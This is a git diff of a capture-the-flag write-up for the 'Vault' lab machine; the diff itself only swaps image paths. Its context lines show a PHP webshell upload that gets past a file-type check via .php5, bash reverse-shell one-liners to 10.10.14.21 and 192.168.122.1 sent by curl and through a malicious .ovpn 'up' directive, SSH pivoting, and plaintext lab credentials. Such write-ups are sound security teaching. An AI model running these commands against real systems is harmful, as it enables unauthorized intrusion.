@@ -4,17 +4,17 @@
 
 Nmap scan:
 
-![](<../../../.gitbook/assets/image%20(3805).png>)
+![](../../../.gitbook/assets/vault-16.png)
 
 ### Sparklays Directories
 
 Port 80 shows this page here.
 
-![](<../../../.gitbook/assets/image%20(1651).png>)
+![](../../../.gitbook/assets/vault-3.png)
 
 The hint here is to check the `/sparklays` directory, which returns a 403 error.
 
-![](<../../../.gitbook/assets/image%20(1685).png>)
+![](../../../.gitbook/assets/vault-4.png)
 
 Since we know this directory exists, what we can do is to use `gobuster` on the `/sparklays` directory to find others. Doing this reveals the `/design` directory.
 
@@ -39,7 +39,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 I also ran a `feroxbuster` scan to leverage on its recursive scans, and found some more directories.
 
-![](<../../../.gitbook/assets/image%20(88).png>)
+![](../../../.gitbook/assets/vault-17.png)
 
 These directories returned nothing, so I did another `gobuster` scan with the `-x` flag to indicate file extensions like .html or .php.
 
@@ -72,11 +72,11 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 On the `design.html` page, all we see is this:
 
-![](<../../../.gitbook/assets/image%20(2775).png>)
+![](../../../.gitbook/assets/vault-10.png)
 
 This brings us to `changelogo.php`, which allows us to upload a file. Only image file are allowed. Obviously, we have to upload a PHP webshell somehow and bypass the file type check. I tried with multiple PHP extensions, and found that `.php5` works.
 
-![](<../../../.gitbook/assets/image%20(2796).png>)
+![](../../../.gitbook/assets/vault-11.png)
 
 ```
 $ curl http://sparklays.com/sparklays/design/uploads/test1.php5?cmd=id
@@ -89,7 +89,7 @@ Now, we have RCE on the machine and can get a reverse shell. We can use this com
 $ curl -G --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.14.21/4444 0>&1"' http://sparklays.com/sparklays/design/uploads/test1.php5
 ```
 
-![](<../../../.gitbook/assets/image%20(1235).png>)
+![](../../../.gitbook/assets/vault-1.png)
 
 ## Privilege Escalation
 
@@ -114,7 +114,7 @@ dave
 Dav3therav3123
 ```
 
-![](<../../../.gitbook/assets/image%20(3517).png>)
+![](../../../.gitbook/assets/vault-14.png)
 
 ### Port Forwarding
 
@@ -137,7 +137,7 @@ ssh -f -N -D 1080 dave@sparklays.com
 
 Then, we can begin to scan both of these machines with `nmap`. Scanning the first 1000 ports, I found that there was indeed a service running on it.
 
-![](<../../../.gitbook/assets/image%20(2105).png>)
+![](../../../.gitbook/assets/vault-6.png)
 
 We can take a look at this using a browser with proxychains configured.
 
@@ -145,15 +145,15 @@ We can take a look at this using a browser with proxychains configured.
 
 The page reveals a DNS server:
 
-![](<../../../.gitbook/assets/image%20(247).png>)
+![](../../../.gitbook/assets/vault-8.png)
 
 The first link doesn't work, but the second brings us to this page where .ovpn files can be uploaded and tested.
 
-![](<../../../.gitbook/assets/image%20(3320).png>)
+![](../../../.gitbook/assets/vault-13.png)
 
 Googling around for possible exploits reveals that it is possible for us to gain a reverse shell using .ovpn files. First we need to find the local IP Address of the machine, which is 192.168.122.1 when inspecting `ip addr` output.
 
-![](<../../../.gitbook/assets/image%20(2390).png>)
+![](../../../.gitbook/assets/vault-7.png)
 
 Then, we can input the following file and run Test VPN.
 
@@ -167,7 +167,7 @@ up "/bin/bash -c 'bash -i >& /dev/tcp/192.168.122.1/4444 0>&1'"
 
 Take note that we have to use the IP address **of the machine** and not our own. With the SSH access we have, we can open a listener port and catch a root shell:
 
-![](<../../../.gitbook/assets/image%20(2607).png>)
+![](../../../.gitbook/assets/vault-9.png)
 
 Here, we can grab the user flag from `/home/dave`. Then we can find more credentials for `dave` on this machine:
 
@@ -180,7 +180,7 @@ dav3gerous567
 
 We can then SSH in as `dave` on the DNS server. This helps to upgrade our shell.
 
-![](<../../../.gitbook/assets/image%20(3598).png>)
+![](../../../.gitbook/assets/vault-15.png)
 
 We are allowed to run `sudo` on everything as `dave` within the DNS server, so regaining root permissions is easy.
 
@@ -252,7 +252,7 @@ The solution in this case is to open a random port via `ncat` that would listen 
 
 The logs revealed that this could potentially be an SSH service for `dave`, so I tried just that and it worked! The same credentials for `dave` on the DNS server were used.
 
-![](<../../../.gitbook/assets/image%20(3316).png>)
+![](../../../.gitbook/assets/vault-12.png)
 
 ### Decrypt Flag
 
@@ -271,7 +271,7 @@ I transferred this to the `ubuntu` machine because it (probably) had the keys im
 
 Then, we can use `gpg -d` to decrypt it.
 
-![](<../../../.gitbook/assets/image%20(1463).png>)
+![](../../../.gitbook/assets/vault-2.png)
 
 Rooted!
 
@@ -281,6 +281,6 @@ I wanted to see if it was possible to get a root shell on the Vault. I transferr
 
 One possible attack vector:
 
-![](<../../../.gitbook/assets/image%20(2086).png>)
+![](../../../.gitbook/assets/vault-5.png)
 
 However, I could not find any other weaknesses within it. I also couldn't run `pspy64` to view any exploitable crons running. Oh well.
